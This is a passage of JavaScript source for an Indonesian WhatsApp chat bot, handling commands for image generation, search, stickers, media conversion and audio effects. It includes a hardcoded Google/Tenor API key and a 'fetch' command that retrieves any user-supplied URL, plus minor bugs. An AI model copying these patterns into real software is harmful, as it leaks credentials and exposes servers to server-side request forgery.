  if (!m.text.includes('.')) return;
  if (!isPremium) return setReply('*khusus Premium*')
if (!isGroup) return setReply()
if (args.length == 0) return m.reply(`Contoh: ${prefix + command} kids,cute`)
		      m.reply(mess.wait)
 ehz.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/txt2img?text=${q}&apikey=${api.dy}` }, caption: `${botName}\n\n Type: ${command}\n\nText: ${q}`})
 }
			break
 case 'ebinary': {

if (!q) return setReply(`Send/reply text with captions ${prefix + command}`)

let { eBinary } = require('./binary')
let eb = await eBinary(`${q}`)
setReply(eb)
}
break
case 'dbinary': {
if (!q) return setReply(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('./binary')
let db = await dBinary(`${q}`)
setReply(db)
}
break
case 'readrecipe':{
if (!q) return setReply(`Example ${prefix+command} https://resepkoki.id/resep/resep-ayam-geprek-keju/`)
setReply(mess.wait)
let rain = await scp1.bacaresep(q)
let dty = `Recipe Below
Title : ${rain.judul_nya}
Time : ${rain.waktu_nya}
Result : ${rain.hasil_nya}
Degree of difficulty : ${rain.tingkat_kesulitan}
Material :
${rain.bahan_nya}`
ehz.sendMessage(m.chat,{
image:{
url:rain.thumb_nya},
caption:dty,
jpegThumbnail: fs.readFileSync("./media/thumbnaildokumen.jpg")},
{quoted:m})
}
break


case 'ttsearch':{
if (!isGroup) return onlyGroup()
if (!isPremium && global.db.data.users[sender].limit < 2) return setReply(mess.wait) // respon ketika limit habis
if(!q) return m.reply (`Mau cari apa??\nCara penggunaan: ${prefix+command} judul|jumlah\n\nContoh: ${prefix+command} taubat|3`)
setReply(mess.wait)
let res = await fetchJson(`https://skizo.tech/api/ttsearch?search=${q}&apikey=${api.dy}`)
let caption = `*TIKTOK SEARCH*

*𖦹 Judul:* ${res.title}
*𖦹 Region:* ${res.region}
*𖦹 Durasi:* ${res.duration}
*𖦹 Musik:* ${res.music}
  *- Musik Info:*
      *• Judul:* ${res.music_info.title}
      *• Link:* ${res.music_info.play}
      *• Author:* ${res.music_info.author}
`
ehz.sendMedia(from, res.play, m, {caption: caption})
db.data.users[sender].limit -= 2 // -1 limit
}
break
case 'shutdown':
   if (!m.text.includes('.')) return;
    	if (!isOwner) return onlyOwner()
    setReply('Ba bye...');
    await sleep(35); // Menunggu 7 jam (dalam detik)
    process.exit();
    break



case 'google': {
  if (!m.text.includes('.')) return;
  if (!isPremium && global.db.data.users[sender].limit < 2) return setReply(mess.limit)
  if (!q) return setReply(`Example : ${prefix + command} <query>`)
  setReply(mess.wait)
  let google = require('google-it')

  google({'query': q}).then(res => {
    let teks = `Google Search Results for : ${q}\n\n`
    for (let g of res) {
      teks += `⭔ *Title* : ${g.title}\n`
      teks += `⭔ *Description* : ${g.snippet}\n`
      teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
    } 
    setReply(teks)
  }).catch(error => {
    console.error('Google Search Error:', error)
    setReply('Error during Google search. Please try again later.')
  })
}
db.data.users[sender].limit -= 2
break


case 'jarak':{
  if (!isPremium) return setReply('*khusus Premium*')
  if (!m.text.includes('.')) return;
if (!isGroup) return onlyGroup()
if(!q.includes("|")) return setReply("Contoh Tasik|Bandung")
let Dari = q.split("|")[0]
let Ke = q.split("|")[1]
async function jarak(dari, ke) {
  let url = `https://www.google.com/search?q=${encodeURIComponent("jarak " + dari + " ke " + ke)}&hl=id`
  let { data } = await axios(url)
  let $ = cheerio.load(data)
  let img = data.split("var s=\'")[1].split("\'")[0]
  let res = {
   result: {
    img: /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,`[1], 'base64') : '',
    desc: $("div.BNeawe.deIvCb.AP7Wnd").text()
    }
  }
  return res
}
let nana = await jarak(Dari,Ke)
let image = nana.result.img
let caption = `*Google Maps* \n\n${nana.result.desc}`
ehz.sendMessage(from,{image, caption},{quoted: m})
}
break


 
case 'akira': case 'akiyama': case 'anna': case 'asuna': case 'ayuzawa': case 'boruto': case 'chitanda': case 'chitoge': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'asuna': case 'erza': case 'gremory': case 'hestia': case 'hinata': case 'inori': case 'itachi': case 'isuzu': case 'itori': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'kaneki': case 'kosaki': case 'kotori': case 'kuriyama': case 'kuroha': case 'kurumi': case 'madara': case 'mikasa': case 'miku': case 'minato': case 'naruto': case 'natsukawa': case 'nekohime': case 'nezuko': case 'nishimiya': case 'onepiece': case 'pokemon': case 'rem': case 'rize': case 'sagiri': case 'sakura': case 'sasuke': case 'shina': case 'shinka': case 'shizuka': case 'shota': case 'tomori': case 'toukachan': case 'tsunade': case 'yatogami': case 'yuki':{
   if (!m.text.includes('.')) return;
  if (!isPremium) return setReply('*khusus Premium*')
  if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()
if (!isGroup) return onlyGroup()
let res = await (await fetch(`https://raw.githubusercontent.com/KazukoGans/database/main/anime/${command}.json`)).json()
let cita = res[Math.floor(Math.random() * res.length)]
await ehz.sendFile(m.chat, cita, 'image.jpg', `_${command}_`, m)

}
break
   case 'wallpaper':
     if (!m.text.includes('.')) return;
     if (!isPremium) return setReply('*khusus Premium*')
if (!isGroup) return onlyGroup()
try{
setReply(mess.wait)
ehz.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random2/${command}?apikey=${api.Lol}` } })
}catch(err){
console.log((err) => setReply(mess.err))
}
break
case 'loli':
  case 'cosplay': 
  case 'husbu':
  case 'milf':
case 'wallml':{
  if (!m.text.includes('.')) return;
if (!isOwner) return onlyOwner()
if (!isGroup) return onlyGroup()
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()
	
setReply(mess.wait)
//let data = global.db.data.others['runtime']
//let time = (new Date - data.runtime) || "Tidak terdeteksi" 
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
let kentir = await getBuffer(wipi)                             
ehz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${TextT}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail:'',sourceUrl: `https://wa.me/${nomerOwner}`																										
}}, image: kentir, caption: `_${command}_` ,footer: `Hasil pencarian dari ${command}`}, { quoted: m })
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1 
}
break
case 'nao':
case 'naotomori': {
  if (!isPremium) return setReply('*khusus Premium*')
if (!isGroup) return onlyGroup()
setReply(mess.wait)
let hehe = `https://api.zahwazein.xyz/randomanime/v2/tomori?apikey=${api.angel}`
ehz.sendMessage(m.chat, { image: { url: hehe }, caption: `_${command}_`}, { quoted: m})
}
break
 //========== TOOLS ===========//
 case 'tomp4': 
	        case 'tovideo': {
if (!isGroup) return onlyGroup()
                if (!/webp/.test(mime)) return setReply(`Reply stiker dengan caption *${prefix + command}*`)
                setReply(mess.wait)
                let media = await ehz.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await ehz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
                
            }
            break
 case 'toimage': 
            case 'toimg': {
if (!isGroup) return onlyGroup()
                if (!/webp/.test(mime)) return setReply(`Reply sticker dengan caption *${prefix + command}*`)
                setReply(mess.wait)
                let media = await ehz.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    ehz.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                
            }
            break
    case 'tomp3': 
            case 'toaudio': {
if (!isGroup) return onlyGroup()
            if (!/video/.test(mime) && !/audio/.test(mime)) return setReply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
            sendSticker(stikot)
            let media = await ehz.downloadMediaMessage(qmsg)
            let audio = await toAudio(media, 'mp4')
            ehz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            
            }
            break
 case 'tr':
case 'translate':{
  if (!m.text.includes('.')) return;
if (!isGroup) return onlyGroup()
let translate = require('translate-google-api')
let defaultLang = 'en'
let tld = 'cn'
let toks = `
Contoh:
${prefix + command} <lang> [text]
${prefix + command} id your messages
Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim()

let lang = args[0]
let text = args.slice(1).join(' ')
if ((args[0] || '').length !== 2) {
lang = defaultLang
text = args.join(' ')
}
if (!text && m.quoted && m.quoted.text) text = m.quoted.text
let result
try {
result = await translate(`${text}`, {to: lang})
} catch (e) {
result = await translate(`${text}`, {to: defaultLang,})
setReply(toks)
} finally {
setReply(result[0])
}
}
break
case 'terbalik':{
if (!isGroup) return onlyGroup()
	if (/audio/.test(mime)){ 
	setReply(mess.wait)
	let media3 = await ehz.downloadAndSaveMediaMessage(quoted,makeid(5))
	let rname = getRandom('.mp3')
	exec(`ffmpeg -i ${media3} -filter_complex "areverse" ${rname}`, async (err, stderr, stdout) => {
	if (err) return setReply('Error!')
	let jadie = fs.readFileSync(rname)
	await ehz.sendMessage(from, {audio: jadie, mimetype: 'audio/mp4' }, {quoted: m})
	fs.unlinkSync(rname)
	fs.unlinkSync(media3)
	}
	)
	} else {
	setReply('Reply audio!')
	}
	}
	break
 case 'tovn': 
            case 'toptt': {
if (!isGroup) return onlyGroup()
            if (!/video/.test(mime) && !/audio/.test(mime)) return setReply(`Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
            setReply(mess.wait)
            let media = await ehz.downloadMediaMessage(qmsg)
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            ehz.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            
            }
            break
 case 'togif': {
if (!isGroup) return onlyGroup()
                if (!/webp/.test(mime)) return setReply(`Reply stiker dengan caption *${prefix + command}*`)
                setReply(mess.wait)
                let media = await ehz.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await ehz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
                
            }
            break
            
            case 'mediafire':

            case 'mf':

            // update case
                if (!q) return setReply(`Masukan Link\nExample: *${command} https://www.mediafire.com/file/pwxob70rpgma9lz/GBWhatsApp_v8.75%2528Tutorial_Yud%2529.apk/file*`)
                m.reply('⚡')
                var res = await mediafiree(q)
               ehz.sendMessage(from, {
                    document: { url: res.link },
                    mimetype: res.filetype,
                    fileName: res.filename
                }, {
                    quoted: msg
                }).catch(() => m.replay(`Terjadi Kesalahan, Tidak Dapat Mengambil Data Atau Ukuran File Terlalu Besar`))
            break
case 'banchat':{
if (!isGroupAdmins) return setReply("Hanya admin")
if (!isGroup) return setReply(mess.only.group)
if (isBanchat) return setReply(`udah di ban`)
db.data.chats[from].banchat = true
setReply(`Bot berhasil Ban di group ini`)
}
break
case 'tourl': {
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!q) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await ehz.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
setReply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
setRelpy(util.format(anu))
}
await fs.unlinkSync(media)
}
break
 case 'bass': 
            case 'blown': 
            case 'deep': 
            case 'earrape': 
            case 'fast': 
            case 'fat': 
            case 'nightcore': 
            case 'reverse': 
            case 'robot': 
            case 'slow': 
            case 'smooth': 
            case 'tupai': {
              if (!isPremium && global.db.data.users[sender].glimit < 20) return setReply('Limit kamu sudah habis, silahkan ketik .limit')
if (!isGroup) return onlyGroup()
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                setReply(mess.wait)
                let media = await ehz.downloadAndSaveMediaMessage(qmsg)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return newReply(err)
                let buff = fs.readFileSync(ran)
                ehz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else setReply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                setReply(e)
                }
                }
                db.data.users[sender].glimit -= 20
            break
 case 'lirik':{
if (!isGroup) return onlyGroup()
if(!q) return setReply("Masukan judul lagu")	
function lirik(judul){
  return new Promise(async(resolve, reject) => {
      axios.get('https://www.musixmatch.com/search/' + judul)
      .then(async({ data }) => {
      const $ = cheerio.load(data)
      const hasil = {};
      let limk = 'https://www.musixmatch.com'
      const link = limk + $('div.media-card-body > div > h2').find('a').attr('href')
        await axios.get(link)
        .then(({ data }) => {
          const $$ = cheerio.load(data)
          hasil.thumb = 'https:' + $$('div.col-sm-1.col-md-2.col-ml-3.col-lg-3.static-position > div > div > div').find('img').attr('src')
          $$('div.col-sm-10.col-md-8.col-ml-6.col-lg-6 > div.mxm-lyrics').each(function(a,b) {
       hasil.lirik = $$(b).find('span > p > span').text() +'\n' + $$(b).find('span > div > p > span').text()
       })
     })
     resolve(hasil)
   })
   .catch(reject)
   })
}
let data = await lirik(q)
let teks =`
Judul: ${q}

Lirik:
${data.lirik}
`
setReply(teks)

}
break
case'toptv':{
try {
  if (!isGroup) return onlyGroup()
    setReply(mess.wait)
if
	(m.message.extendedTextMessage) 
{
  var dataVideo = { ptvMessage: m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage }
    ehz.relayMessage(m.chat, dataVideo, {})
 }
    } catch (error) {
        m.reply(error);
        }
        }
        break
  case "get":
case "fetch":
  if (!q) {
    if (!m.text.includes('.')) return;
    return m.reply(`Contoh:\n${prefix + command} https://github.com/`);
  }
  if (!/^https?:\/\//.test(q)) {
    return m.reply("URL is Invalid!");
  }
  var requestOptions = {
    method: "GET",
    redirect: "follow",
  };
  
  if (body.match(/(mp4)/gi)) {
    fetch(`${q}`, requestOptions)
      .then((res) => ehz.sendMessage(from, { video: { url: `${q}` }, mimetype: "video/mp4", caption: "Success" }, { quoted: m }))
      .catch((error) => m.reply("Error", error));
  } else if (body.match(/(mp3)/gi)) {
    fetch(`${q}`, requestOptions)
      .then((res) => ehz.sendMessage(from, { audio: { url: `${q}` }, mimetype: "audio/mp4", fileName: "Audio" }, { quoted: m }))
      .catch((error) => m.reply("Error", error));
  } else if (body.match(/(png|jpg|jpeg)/gi)) {
    fetch(`${q}`, requestOptions)
      .then((res) => ehz.sendMessage(from, { image: { url: `${q}` }, caption: "Success" }, { quoted: m }))
      .catch((error) => m.reply("Error", error));
  } else {
    fetch(`${q}`, requestOptions)
      .then((response) => response.text())
      .then((result) => m.reply(result))
      .catch((error) => m.reply("Error", error));
  }
  break
  case 'removebg':
  case 'nobg': {
if (!m.text.includes('.')) return;
 if (!isGroup) return onlyGroup()
 if (!isMedia) return setReply("Where The A Image")
                setReply(mess.wait)
                let media = await ehz.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                ehz.sendMessage(m.chat, {
                    image: { url: `https://api.lolhuman.xyz/api/removebg?apikey=${api.Lol}&img=${anu}` },caption: "nih kak>\<" }, { quoted: m}) }
            break
  case 'flaming1':{
if (!isGroup) return onlyGroup()
if (args.length == 0) return setReply(`Example: ${prefix + command} Teks`)
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()

setReply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&script=fluffy-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=${ini_txt}`
ehz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `dy_net`, mediaType: 3,  renderLargerThumbnail : true,thumbnailUrl:"https://telegra.ph/file/8b71af37d07670a5f2228.jpg",sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: {url:buffer}, caption: `${mess.success}`}, { quoted: m})
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
 case 'flaming2':{
if (!isGroup) return onlyGroup()
if (args.length == 0) return setReply(`Example: ${prefix + command} Teks`)
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()

setReply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text=${ini_txt}`
ehz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `dy_net`, mediaType: 3,  renderLargerThumbnail : true,thumbnailUrl: 'https://telegra.ph/file/8b71af37d07670a5f2228.jpg',sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: {url:buffer}, caption: `${mess.success}`}, { quoted: m})
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
// ===================================== //
case 'flaming3':{
if (!isGroup) return onlyGroup()
if (args.length == 0) return setReply(`Example: ${prefix + command} Teks`)
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()

setReply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=${ini_txt}`
ehz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botName}`, mediaType: 3,  renderLargerThumbnail : true,thumbnailUrl: 'https://telegra.ph/file/8b71af37d07670a5f2228.jpg',sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: {url:buffer}, caption: `${mess.success}`}, { quoted: m})
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
// ===================================== //
case 'flaming4':{
if (!isGroup) return onlyGroup()
if (args.length == 0) return setReply(`Example: ${prefix + command} Teks`)
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()

setReply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&fillColor1Color=%23f2aa4c&fillColor2Color=%23f2aa4c&fillColor3Color=%23f2aa4c&fillColor4Color=%23f2aa4c&fillColor5Color=%23f2aa4c&fillColor6Color=%23f2aa4c&fillColor7Color=%23f2aa4c&fillColor8Color=%23f2aa4c&fillColor9Color=%23f2aa4c&fillColor10Color=%23f2aa4c&fillOutlineColor=%23f2aa4c&fillOutline2Color=%23f2aa4c&backgroundColor=%23101820&text=${ini_txt}`
ehz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botName}`, mediaType: 3,  renderLargerThumbnail : true,thumbnailUrl:'https://telegra.ph/file/8b71af37d07670a5f2228.jpg',sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: {url:buffer}, caption: `${mess.success}`}, { quoted: m})
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
// ===================================== //
case 'flaming5':{
if (!isGroup) return onlyGroup()
if (args.length == 0) return setReply(`Example: ${prefix + command} Teks`)
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()

setReply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&script=water-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=${ini_txt}`
ehz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botName}`, mediaType: 3,  renderLargerThumbnail : true,thumbnailUrl:'https://telegra.ph/file/8b71af37d07670a5f2228.jpg',sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: {url:buffer}, caption: `${mess.success}`}, { quoted: m})
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
// ===================================== //
case 'flaming6':{
if (!isGroup) return onlyGroup()
if (args.length == 0) return setReply(`Example: ${prefix + command} Teks`)
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()

setReply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=0&backgroundColor=%23101820&text=${ini_txt}`
ehz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botName}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./media/thumb.jpeg'),sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: {url:buffer}, caption: `${mess.success}`}, { quoted: m})
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
case 'emojimix': {
                let [emoji1, emoji2] = q.split`+`
                if (!emoji1) return setReply(`Contoh : ${prefix + command} 😅+🤔`)
                if (!emoji2) return setReply(`Contoh : ${prefix + command} 😅+🤔`)
                setReply(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await ehz.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packName,
                        author: 'tes',
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
                
            }
            break
            case 'qc':{
if (!isGroup) return onlyGroup()
if (!isPremium && global.db.data.users[sender].limit < 5) return setReply("limit mu habis ketik .profil untuk melihat limit anda")
if (!q) return setReply ('Masukkan Teks') 

let qc = `https://api.lolhuman.xyz/api/bubblechat?apikey=${api.Lol}&avatar=https://telegra.ph/file/888ac45cd28b85104866b.jpg&name=${pushname}&text=${q}`
ehz.sendVideoAsSticker(from, qc, m, { packname: global.packName, author: global.author })

db.data.users[sender].limit -= 5
}
break

case 'patrick':
case 'petrik':
case 'stikpatrick': {
if (!isGroup) return onlyGroup()

setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
ehz.sendImageAsSticker(from, pjr, m)
}).catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
// ===================================== //
case 'dogestick': 
case 'doge': 
case 'domge':
case 'dogesticker': {
if (!isGroup) return onlyGroup()
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()

setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
ehz.sendImageAsSticker(from, pjr, m)
}).catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
// ===================================== //
case 'lovestick' :
case 'slove':
case 'lovesticker': {
if (!isGroup) return onlyGroup()
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()

setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
ehz.sendImageAsSticker(from, pjr, m)
}).catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
// ===================================== //
case 'gura': 
case 'gurastick': {
  if (!m.text.includes('.')) return;
if (!isGroup) return onlyGroup()
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()

setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
ehz.sendImageAsSticker(from, pjr, m)
}).catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
// ===================================== //
case 'paimon': {
if (!isGroup) return onlyGroup()
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()

setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/Paimon')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
ehz.sendImageAsSticker(from, pjr, m)
})
db.data.users[sender].limit -= 1
}
break
case 'mukelu': 
case 'lu':
case 'mukestik': {
  if (!m.text.includes('.')) return;
if (!isGroup) return onlyGroup()
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()

setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/mukelu')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
ehz.sendImageAsSticker(from, pjr, m)
}).catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
case 'smeme': {
  if (!m.text.includes('.')) return;
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) return setReply(respond)
            if (!q) return setReply(respond)
	        setReply(mess.wait)
            let atas = q.split('|')[0] ? q.split('|')[0] : '-'
            let bawah = q.split('|')[1] ? q.split('|')[1] : '-'
	        let dwnld = await ehz.downloadAndSaveMediaMessage(qmsg)
	        let fatGans = await TelegraPh(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
	        let FaTiH = await ehz.sendImageAsSticker(m.chat, smeme, m, { packname: global.packName, author: global.authorName })
	        await fs.unlinkSync(FaTiH)
            }
	        break
case 'take': case 'swm': {
  if (!m.text.includes('.')) return;
                let [teks1, teks2] = q.split`|`
                if (!teks1) return setReply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
                if (!teks2) return setReply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|text2 t`)
            setReply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await ehz.downloadMediaMessage(qmsg)
                    let encmedia = await ehz.sendImageAsSticker(m.chat, media, m, { pacname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return setReply('Maksimal 10 detik!')
                    let media = await ehz.downloadMediaMessage(qmsg)
                    let encmedia = await ehz.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else {
                    return setReply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
 case 'attp':
   if (!m.text.includes('.')) return;
                if (!q) return setReply('Masukan Text')
                setReply(mess.wait)
                ehz.sendMessage(m.chat, { sticker: { url: `https://api.lolhuman.xyz/api/attp?apikey=${api.Lol}&text=${q}`} }, { quoted: m })
                break
case 'ttp':{
	const text2png = require('text2png');
	await fs.writeFileSync('out.png', text2png(q, {font: '100px coolvetica rg',
		localFontPath: 'src/font/coolvetica rg.otf',
	  localFontName: 'coolvetica rg',                                            
	  color: 'white',
	  textAlign: "left",
	  lineSpacing: 10,
	  strokeColor: "black",
	  strokeWidth : 2,
	  padding: 20}))
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = fs.readFileSync('out.png')
	let jancok = new Sticker(media, {
		pack: packName, // The pack name
		author: authorName, // The author name
		type: StickerTypes.FULL, // The sticker type
		categories: ['🤩', '🎉'], // The sticker category
		id: '12345', // The sticker id
		quality: 70, // The quality of the output file
		background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await ehz.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync('out.png')
	}
	break
case 'tts':
